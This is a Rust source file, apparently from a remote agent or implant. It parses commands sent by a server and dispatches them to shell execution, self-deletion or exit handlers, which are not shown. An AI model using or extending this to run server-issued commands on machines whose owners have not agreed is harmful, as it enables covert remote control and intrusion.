use crate::actions::command_kind::CommandKind;
use crate::actions::functions;
use std::io;

// command struct used to present an agent's command
pub struct Command {
    kind: CommandKind,
    content: String,
}

impl Command {
    // private fields getters
    pub fn kind(&self) -> &CommandKind {
        &self.kind
    }

    pub fn content(&self) -> &String {
        &self.content
    }

    // create a new command from a server message
    pub fn from_server(content: String) -> Command {
        // split by first word (command identifier)
        let v: Vec<&str> = content.split_whitespace().collect();
        let command_id = v.get(0);

        // if v is empty
        if let None = command_id {
            return Command {
                kind: CommandKind::None,
                content: String::new(),
            };
        }

        // parse command type
        let command_id = command_id.unwrap().to_string();
        let kind = CommandKind::parse_kind(&command_id);

        // get command's content
        let content = v[1..].join(" ");

        Command { kind, content }
    }

    // execute command
    pub fn execute(&self) -> Result<String, io::Error> {
        match self.kind() {
            CommandKind::Cmd => functions::cmd_exec(self.content()),
            CommandKind::Delete => functions::delete_agent(),
            CommandKind::Exit => functions::exit(),
            CommandKind::None => functions::nothing(),
            CommandKind::Unknown => functions::unknown_command(),
        }
    }
}
